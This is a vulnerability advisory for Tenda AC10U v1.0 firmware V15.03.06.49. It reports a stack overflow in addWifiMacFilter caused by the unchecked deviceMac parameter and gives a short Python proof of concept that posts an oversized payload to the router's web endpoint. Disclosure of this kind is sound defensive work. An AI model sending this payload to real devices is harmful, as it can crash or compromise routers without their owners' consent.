## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 V15.03.06.49 firmware has a stack overflow vulnerability in the `addWifiMacFilter` function. The `device_mac` variable receives the `deviceMac` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceMac` can trigger this security vulnerability.

![image-20240309185842004](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309185842004.png)

![image-20240309185809016](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309185809016.png)

![image-20240309185820678](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309185820678.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addWifiMacFilter"
payload = b"a"*1000

data = {"deviceMac": payload, "deviceId":1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240309191223140](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309191223140.png)